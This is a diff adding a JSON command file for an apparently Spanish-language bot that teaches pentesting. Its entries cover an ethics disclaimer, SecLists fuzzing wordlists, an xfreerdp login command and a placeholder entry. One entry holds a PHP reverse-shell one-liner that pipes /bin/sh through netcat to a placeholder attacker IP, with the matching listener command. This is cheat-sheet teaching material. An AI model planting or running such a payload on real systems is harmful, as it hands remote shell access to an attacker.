@@ -1,0 +1,42 @@
+[
+    {
+        "NombreC": "start",
+        "DescripC": "iniciar bot",
+        "Respuesta": "Bienvenido al bot para aprender pentesting"
+    },
+    {
+        "NombreC": "info",
+        "DescripC": "información sobre el proposito del bot",
+        "Respuesta": "Este bot está diseñado exclusivamente para fines educativos y éticos.\n\n No utilices las técnicas o herramientas presentadas aquí para actividades ilegales o no éticas. \n\n El propósito es compartir mis conocimientos sobre pentesting."
+    },
+    {
+        "NombreC": "fuentes",
+        "DescripC": "consultar fuentes de información",
+        "Respuesta": "Aprende y practica hacking: https://academy.hackthebox.com/"
+    },
+    {
+        "NombreC": "seclits_parameter",
+        "DescripC": "Descripción de burp-parameter",
+        "Respuesta": "ubicación: /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt \n\n sirve para buscar parametros en la url de un sitio web que funciona con php por \n\n ejemplo: http://dominio/index?FUZZ=valor \n\n la variable FUZZ es un parametro que será buscado por una herramienta como ffuf o wfuf"
+    },
+    {
+        "NombreC": "seclists_directory",
+        "DescripC": "Descripción de Directory-lists",
+        "Respuesta": "ubicación de las listas: SecLists/Discovery/Web-Content/[listas]\n\n sirve para buscar tanto archivos como direcorios en la url de un sitio web que funciona con php ejemplo de directorio: http://dominio/FUZZ\n\n ejemplo de archivo: http://dominio/directorio/FUZZ.php\n\n la variable FUZZ es un archivo o direcotior que será buscado por una herramienta como ffuf o wfuf"
+    },
+    {
+        "NombreC": "reverce_shell",
+        "DescripC": "Dar reverce shell",
+        "Respuesta": "<?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP de atacante] [PUERTO] >/tmp/f\"); ?> \n\n Nota: activar el netcat de la siguiente manera: nc -lvnp [PUERTO]"
+    },
+    {
+        "NombreC": "comando4",
+        "DescripC": "Descripcion4",
+        "Respuesta": "Respuesta larga4"
+    },
+    {
+        "NombreC": "win_remote_desktop",
+        "DescripC": "abrir escritorio windows de forma remota",
+        "Respuesta": "xfreerdp /v:[IP] /u:[Usuario] /p:[Contraseña]"
+    }
+]
